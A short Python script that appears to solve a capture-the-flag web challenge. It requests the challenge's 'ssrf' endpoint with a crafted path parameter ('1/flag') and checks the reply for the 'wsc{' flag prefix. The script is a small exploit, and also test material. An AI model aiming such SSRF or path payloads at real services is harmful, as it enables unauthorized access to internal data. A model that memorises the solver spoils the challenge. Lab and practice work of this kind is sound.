import requests

CHAL_URL = 'https://wsc-2022-web-1-bvel4oasra-uc.a.run.app/'
FLAG_PREFIX = 'wsc{'


def solve():
    url = CHAL_URL + 'ssrf?path=1/flag'
    response = requests.get(url)
    if response.status_code < 300 and (FLAG_PREFIX in response.text):
        print('solved')
    else:
        print('Error: ', response.status_code, response.text)

solve()
